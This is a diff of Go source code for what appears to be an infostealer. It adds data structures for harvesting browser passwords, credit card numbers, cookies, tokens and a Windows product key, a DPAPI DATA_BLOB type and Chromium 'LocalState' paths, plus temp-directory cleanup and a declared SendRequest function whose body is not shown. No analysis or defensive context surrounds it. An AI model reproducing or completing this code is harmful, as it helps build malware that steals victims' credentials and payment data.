@@ -3,6 +3,7 @@ package main
 import (
 	"encoding/base64"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"log"
 	"math/rand"
@@ -12,6 +13,8 @@ import (
 	"regexp"
 	"strings"
 	"time"
+
+	_ "github.com/mattn/go-sqlite3"
 )
 
 const (
@@ -28,6 +31,8 @@ var (
 	PERSONAL string = os.Getenv("USERPROFILE")
 
 	HEADERS [999]string
+
+	TEMPFILEDIR string = TEMP + "\\" + RandStringBytes(16)
 )
 
 type geninf struct {
@@ -42,8 +47,42 @@ type dumps struct {
 	Passwords   []PASSWD   `json:"passwords"`
 	CreditCards []CCARD    `json:"credit-cards"`
 	Cookies     []COOKIE   `json:"cookies"`
-	ProductKey  PRODUCTKEY `json:"product-key"`
+	ProductKey  PRODUCT_ID `json:"product-key"`
 	Tokens      []string   `json:"tokens"`
+}
+
+type DATA_BLOB struct {
+	cbData uint32
+	pbData *byte
+}
+
+type PLATFORM struct {
+	Chromium   bool
+	LocalState string
+	DataFiles  string
+}
+
+type PASSWD struct {
+	Url  string `json:"url"`
+	User string `json:"username"`
+	Pass string `json:"password"`
+}
+
+type CCARD struct {
+	Name       string `json:"name"`
+	Number     string `json:"number"`
+	Expiration string `json:"exp"`
+}
+
+type COOKIE struct {
+	Host  string `json:"url"`
+	Name  string `json:"name"`
+	Value string `json:"value"`
+}
+
+type PRODUCT_ID struct {
+	Value string `json:"value"`
+	Type  string `json:"type"`
 }
 
 type OUTPUT struct {
@@ -60,7 +99,18 @@ type SysInfo struct {
 }
 
 func CleanUp() {
-	_ = os.RemoveAll(TempFileDir)
+	_ = os.RemoveAll(TEMPFILEDIR)
+}
+
+func main() {}
+
+func FileExists(filePath string) bool {
+	_, err := os.OpenFile(filePath, os.O_RDWR, 0666)
+	if errors.Is(err, os.ErrNotExist) {
+		return false
+	} else {
+		return true
+	}
 }
 
 func SendRequest(body string) {
